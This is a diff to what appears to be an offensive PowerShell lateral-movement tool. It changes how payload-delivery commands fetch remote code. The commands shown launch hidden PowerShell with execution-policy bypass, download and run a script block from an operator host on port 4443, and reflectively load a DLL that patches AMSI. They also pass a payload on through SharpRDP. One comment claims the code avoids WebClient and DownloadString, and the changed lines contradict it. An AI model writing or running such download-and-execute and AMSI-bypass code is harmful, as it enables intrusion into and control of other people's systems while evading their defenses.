@@ -3212,13 +3212,13 @@ while (`$true) {
 			$_servePS = (New-PayloadScript -ComputerName $ComputerName -PipeName $PipeName -Config $_liteConfig).InlinePS
 			$_serveURL   = "http://$_srvIP`:4443/$_pipeFile"
 			# [2] serve: iwr+scriptblock — no iex/new-object/webclient/downloadstring
-			$_srvCmdIwr  = "powershell -nop -ep bypass -w hidden -c `"&([scriptblock]::Create((iwr '$_serveURL' -UseBasicParsing).Content))`""
+			$_srvCmdIwr  = "powershell -nop -ep bypass -w hidden -c `"&([scriptblock]::Create((New-Object Net.WebClient).DownloadString('$_serveURL')))`""
 			$global:LastInlinePS = $built.InlinePS
 			[System.IO.File]::WriteAllText($_pipePath, $_servePS, (New-Object System.Text.UTF8Encoding $False))
 			# CMD option: bootstrap (DLL AMSI patch + Runspace) if available, else iwr fallback
 			if ($AmnesiacLoaderB64 -and $_alByp -and $_alPar -and $_alInj -and $_alInPS) {
 				try { [System.IO.File]::WriteAllBytes((Join-Path $global:AmnesiacRoot $_dllFile), [Convert]::FromBase64String($AmnesiacLoaderB64)) } catch {}
-				$_cmdPayload = "powershell -ep bypass -c `"`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$_srvIP`:4443/$_dllFile'));`$_a.GetType('$_alNs.$_alByp').GetMethod('$_alPar').Invoke(`$null,`$null);`$_sc=(iwr '$_serveURL' -UseBasicParsing).Content;`$_a.GetType('$_alNs.$_alInj').GetMethod('$_alInPS').Invoke(`$null,[object[]]@([int]0,`$_sc))`""
+				$_cmdPayload = "powershell -ep bypass -c `"`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$_srvIP`:4443/$_dllFile'));`$_a.GetType('$_alNs.$_alByp').GetMethod('$_alPar').Invoke(`$null,`$null);`$_sc=(New-Object Net.WebClient).DownloadString('$_serveURL');`$_a.GetType('$_alNs.$_alInj').GetMethod('$_alInPS').Invoke(`$null,[object[]]@([int]0,`$_sc))`""
 			} else {
 				$_cmdPayload = $_srvCmdIwr
 			}
@@ -3469,8 +3469,8 @@ while (`$true) {
 		$_servePS = (New-PayloadScript -IsServer -PipeName $PN -SID $stealthSID -Config $_liteConfig).InlinePS
 		$_serveURL     = "http://$_operatorIP`:4443/$_pipeFile"
 		# [2] serve: iwr+scriptblock — no iex/new-object/webclient/downloadstring
-		$_srvCmdIwr    = "powershell -nop -ep bypass -w hidden -c `"&([scriptblock]::Create((iwr '$_serveURL' -UseBasicParsing).Content))`""
-		$_sharpRDPCmd  = "command=powershell -nop -ep bypass -w hidden -c `"&([scriptblock]::Create((iwr '$_serveURL' -UseBasicParsing).Content))`""
+		$_srvCmdIwr    = "powershell -nop -ep bypass -w hidden -c `"&([scriptblock]::Create((New-Object Net.WebClient).DownloadString('$_serveURL')))`""
+		$_sharpRDPCmd  = "command=powershell -nop -ep bypass -w hidden -c `"&([scriptblock]::Create((New-Object Net.WebClient).DownloadString('$_serveURL')))`""
 		# Write pipe file to disk for serve-based delivery and SharpRDP last-resort.
 		# winrm delivery uses $global:LastInlinePS directly — no serve or disk file needed.
 		[System.IO.File]::WriteAllText($_pipePath, $_servePS, (New-Object System.Text.UTF8Encoding $False))
@@ -3480,7 +3480,7 @@ while (`$true) {
 		# CMD option: bootstrap (DLL AMSI patch + Runspace) if available, else iwr fallback
 		if ($AmnesiacLoaderB64 -and $_alByp -and $_alPar -and $_alInj -and $_alInPS) {
 			try { [System.IO.File]::WriteAllBytes((Join-Path $global:AmnesiacRoot $_dllFile), [Convert]::FromBase64String($AmnesiacLoaderB64)) } catch {}
-			$_cmdPayload = "powershell -ep bypass -c `"`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$_operatorIP`:4443/$_dllFile'));`$_a.GetType('$_alNs.$_alByp').GetMethod('$_alPar').Invoke(`$null,`$null);`$_sc=(iwr '$_serveURL' -UseBasicParsing).Content;`$_a.GetType('$_alNs.$_alInj').GetMethod('$_alInPS').Invoke(`$null,[object[]]@([int]0,`$_sc))`""
+			$_cmdPayload = "powershell -ep bypass -c `"`$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$_operatorIP`:4443/$_dllFile'));`$_a.GetType('$_alNs.$_alByp').GetMethod('$_alPar').Invoke(`$null,`$null);`$_sc=(New-Object Net.WebClient).DownloadString('$_serveURL');`$_a.GetType('$_alNs.$_alInj').GetMethod('$_alInPS').Invoke(`$null,[object[]]@([int]0,`$_sc))`""
 		} else {
 			$_cmdPayload = $_srvCmdIwr
 		}
